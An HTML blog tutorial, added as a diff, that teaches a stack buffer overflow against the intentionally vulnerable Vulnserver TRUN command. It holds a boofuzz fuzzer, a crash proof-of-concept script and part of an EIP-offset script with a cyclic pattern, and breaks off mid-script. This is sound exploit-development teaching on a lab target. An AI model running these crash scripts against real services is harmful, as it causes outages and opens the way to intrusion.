@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>secoats | Vulnserver Part 1 - TRUN</title>
+        <link rel="canonical" href="https://secoats.github.io/posts/vulnserver_1_trun.html" />
+        <meta name="description" content="Ramblings about InfoSec, Pentesting, CTF and Tools" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="google-site-verification" content="ec3XZVmgp3ZOsiLB8riLA-9B5kVJVR_71u11vmIMs4w" />
+        <meta property="og:type" content="article" />
+        <meta property="og:locale" content="en_US" />
+        <meta property="og:site_name" content="secoats" />
+        <meta property="og:title" content="Vulnserver Part 1 - TRUN" />
+        <meta property="og:url" content="https://secoats.github.io/posts/vulnserver_1_trun.html" />
+        <meta name="author" content="secoats">
+        <meta property="article:author" content="secoats">
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" />
+    </head>
+    <body>
+        <div id="main">
+            <div id="header">
+                <div id="masthead" class="wrapper">
+                    <span class="site-title">
+                        <a href="/">secoats</a>
+                    </span>
+                    <span class="main-nav">
+                        <a href="/posts.html">Posts</a>
+<a href="/categories.html#writeup">Writeups</a>
+<a href="/categories.html#tutorial">Tutorials</a>
+                    </span>
+                </div>
+            </div>
+            <main id="content" class="wrapper">
+                <article class="mbox">
+                    <h1 class="article-headline">Vulnserver Part 1 - TRUN</h1>
+                    <p class="article-subline">
+                        <span class="article-meta-reading-time"><i class="far fa-clock" aria-hidden="true"></i> 15 minute read</span> - <span class="article-meta-published">September 07, 2021</span>
+                    </p>
+                    <p>In this first part of our Vulnserver series we will take a look at the TRUN command. It offers a very simple Stack-based Buffer Overflow with a little bit of fuzzing.</p>
+<p>I'll go into a little more detail in this first tutorial, as some concepts might be new to beginners.</p>
+<h2 id="aaaa-not-today">AAAA? Not today!<a class="headerlink" href="#aaaa-not-today" title="Permanent link"> </a></h2>
+<p>This is the basic anatomy of a buffer overflow Proof of Concept:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># vanilla buffer overflow example</span>
+<span class="c1"># this won't work here!</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span> <span class="c1"># ip address of your windows machine</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">2048</span>
+
+<span class="c1"># create a TCP socket connection to the target</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># read the greeting / banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># Prepare the payload</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN "</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">size</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Sending evil buffer..."</span><span class="p">)</span>
+
+<span class="c1"># send the payload</span>
+<span class="c1"># this will send: TRUN AAAAAAAAAA....</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># If the exploit worked then this script should get "stuck" at this point </span>
+<span class="c1"># because the socket connection died before we could receive an answer from the server</span>
+
+<span class="c1"># but if the server responds, then the exploit failed:</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>In other beginner tutorials you might have seen this code before. You would simply increase the value of <code>size</code> until the server crashes.</p>
+<p>But you will quickly notice that this won't work here. What is going on here? We know the TRUN command is vulnerable, but regardless of how big the buffer is that you send, the server will not crash.</p>
+<p>As it turns out the server requires a specific character sequence in order to crash.</p>
+<h2 id="fuzzing-for-a-crash">Fuzzing for a Crash<a class="headerlink" href="#fuzzing-for-a-crash" title="Permanent link"> </a></h2>
+<p>There are many fuzzers out there that can be used to test for buffer overflows (e.g. <a href="https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE">SPIKE</a>), but we will stick to Python3 in this tutorial and use the <a href="https://boofuzz.readthedocs.io/en/stable/index.html">boofuzz</a> library.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ python3 -m pip install boofuzz
+</code></pre></div></div></div>
+<p>The boofuzz website linked above offers a <a href="https://boofuzz.readthedocs.io/en/stable/user/quickstart.html">Quickstart tutorial</a>.</p>
+<p>The basic setup is easy enough. I have created a file <code>trun_0_boofuzz.py</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN - Step 0 -- Fuzzing for a crash</span>
+<span class="kn">from</span> <span class="nn">boofuzz</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># stop when server is dead</span>
+<span class="k">def</span> <span class="nf">is_alive</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">my_logger</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">banner</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10000</span><span class="p">)</span>
+
+        <span class="c1"># See if we received the standard banner</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">banner</span> <span class="ow">or</span> <span class="n">banner</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">'Welcome to Vulnerable Server! Enter HELP for help.</span><span class="se">\n</span><span class="s1">'</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"Banner does not match"</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"Unable to connect. Target is down. Exiting."</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">(</span>
+    <span class="n">sleep_time</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">target</span><span class="o">=</span><span class="n">Target</span><span class="p">(</span>
+            <span class="n">connection</span><span class="o">=</span><span class="n">SocketConnection</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="s1">'tcp'</span><span class="p">)</span>
+        <span class="p">),</span>
+    <span class="p">)</span>
+
+    <span class="n">s_initialize</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">"Request"</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">s_block</span><span class="p">(</span><span class="s2">"Host-Line"</span><span class="p">):</span>
+        <span class="n">s_static</span><span class="p">(</span><span class="s2">"TRUN"</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">'command name'</span><span class="p">)</span>
+        <span class="n">s_delim</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span>
+        <span class="n">s_string</span><span class="p">(</span><span class="s2">"FUZZ"</span><span class="p">,</span>  <span class="n">name</span><span class="o">=</span><span class="s1">'trun variable content'</span><span class="p">)</span>
+        <span class="n">s_delim</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+
+    <span class="c1"># the callback function gets executed after each test</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">s_get</span><span class="p">(</span><span class="s2">"Request"</span><span class="p">),</span> <span class="n">callback</span><span class="o">=</span><span class="n">is_alive</span><span class="p">)</span> 
+    <span class="n">session</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div></div>
+<p>Run the fuzzer:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ python3 trun_0_boofuzz.py
+</code></pre></div></div></div>
+<p>The fuzzer should run for a few minutes and eventually stop executing once it detects a crash:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Fuzzer crashes the server" src="/assets/img/vulnserver_trun_00_fuzzer_result.png"/></div></div></p>
+<p>In Immunity the Disassembly window will be completely black and the status "Access Violation when executing..." will be visible in the bottom left.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="The server is crashed" src="/assets/img/vulnserver_trun_01_fuzzer_crash.png"/></div></div></p>
+<p>Looks like we found a character sequence that works.</p>
+<p>If we scroll up a bit in the window where we ran the boofuzz script then we can see the crash sequence is:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="sa">b</span><span class="s1">'TRUN /./././.'</span> <span class="c1">#... repeated many times</span>
+</code></pre></div></div></div>
+<p>If we count the sent characters then we get a total length of 10007 bytes.</p>
+<p>It seems the character values for '/' and '.' are required in order to cause a crash. Now the question would be how many of those we actually need in order to cause a crash. And whether we can replace some of those bytes with a proper payload. </p>
+<h2 id="proof-of-concept">Proof of Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link"> </a></h2>
+<p>After some trial and error I narrowed it down to the following sequence that can be used to consistently cause a crash:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN Step 1 - cause a crash / proof of concept</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">size</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>The 'A' bytes represent the part of the buffer that we can freely use in order to upload a payload.</p>
+<h2 id="eip-offset">EIP Offset<a class="headerlink" href="#eip-offset" title="Permanent link"> </a></h2>
+<p>After running the PoC you might notice that the ESP (Stack Pointer) register points to a specific address in the overwritten stack space. And the EIP (Instruction Pointer) points to a non-existent address 0x41414141 (hex for "AAAA"). The crash was caused because the program tried to jump to that non-existent address.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="EIP location after crash" src="/assets/img/vulnserver_trun_10_eip_after_crash.png"/></div></div></p>
+<p>We will need to figure out the exact offset between the start of our sent buffer and this stack location if we want to take control over the command flow and hijack the program.</p>
+<p>The metasploit framework comes with a convenient tool that can be used in order to generate a unique byte pattern:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msf-pattern_create -l <span class="m">4096</span>
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac...
+</code></pre></div></div></div>
+<p>The <code>-l</code> parameter should match the number of A's we previously sent.</p>
+<p>Plug that sequence into our script:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># TRUN Step 2 - discover eip offset</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="c1"># msf-pattern_create -l 4096</span>
+<span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"x3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"h3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"r3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"l3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"v3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"z3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2E"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"j3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2E"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"t3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"d3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F"</span>
+
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
